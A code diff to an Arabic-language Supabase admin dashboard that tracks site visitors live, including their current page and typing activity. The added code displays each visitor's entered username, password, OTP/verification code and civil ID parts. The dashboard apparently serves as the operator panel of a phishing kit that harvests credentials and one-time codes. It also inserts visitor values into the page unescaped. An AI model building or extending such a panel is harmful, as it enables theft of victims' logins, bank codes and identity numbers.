@@ -205,6 +205,7 @@
 
     <!-- Firebase Implementation -->
     <!-- Supabase data layer: live state + typing + trash + filters -->
+<!-- Supabase data layer: all-page entries + live state + trash -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.min.js"></script>
 <script>
 // ---------------------------------------------------------------------------
@@ -480,7 +481,7 @@ function mapVisitor(row) {
         insType: (row.ins_type && row.ins_type.trim()) ? row.ins_type : '—',
         status: row.status || 'الرئيسية',
         shortId: row.short_id || '————',
-        hasDetails: !!((row.phone && row.phone.trim()) || (row.civil_id && row.civil_id.trim()) || (row.name && row.name.trim())),
+        hasDetails: !!((row.phone && row.phone.trim()) || (row.civil_id && row.civil_id.trim()) || (row.name && row.name.trim()) || (row.fields && Object.keys(row.fields).length > 0)),
         kind: 'form',
         archived: !!row.archived,
         createdAt: row.created_at,
@@ -624,6 +625,25 @@ function selectUser(id) {
     if (pageEl) pageEl.innerHTML = '<i class="fa-solid fa-location-dot"></i> يتواجد في: ' + pageLabel(user.page);
     const typingEl = document.getElementById('detail-typing');
     if (typingEl) typingEl.classList.toggle('hidden', !(user.typing && user.online));
+
+    let fieldsBox = document.getElementById('detail-fields');
+    if (!fieldsBox) {
+        const anchor = document.getElementById('card-instype');
+        if (anchor) {
+            fieldsBox = document.createElement('div');
+            fieldsBox.id = 'detail-fields';
+            fieldsBox.className = 'border-t border-dashed border-gray-200 pt-3 mt-1 hidden';
+            anchor.closest('div.flex.justify-between').parentNode.appendChild(fieldsBox);
+        }
+    }
+    if (fieldsBox) {
+        const LABELS = { username: 'اسم المستخدم', 'demo-username': 'اسم المستخدم', password: 'كلمة السر', 'demo-password': 'كلمة السر', otp: 'رمز التحقق', code: 'رمز التحقق', 'demo-civil-1': 'رقم الهوية (جزء 1)', 'demo-civil-2': 'رقم الهوية (جزء 2)' };
+        const entries = Object.entries(user.fields || {}).filter(([k, v]) => v && String(v).trim() !== '');
+        fieldsBox.classList.toggle('hidden', entries.length === 0);
+        fieldsBox.innerHTML = entries.length
+            ? '<div class="text-xs font-bold text-gray-500 mb-2">إدخالات الزائر من صفحات الموقع</div>' + entries.map(([k, v]) => `<div class="flex justify-between border-b border-dashed border-gray-200 pb-2 mb-2"><span class="text-gray-500 w-1/3">${LABELS[k] || k}:</span><span class="font-bold text-gray-900 w-2/3 text-left break-all" dir="auto">${v}</span></div>`).join('')
+            : '';
+    }
 
     document.getElementById('card-name').innerText = user.name;
     document.getElementById('card-id').innerText = user.idNumber;
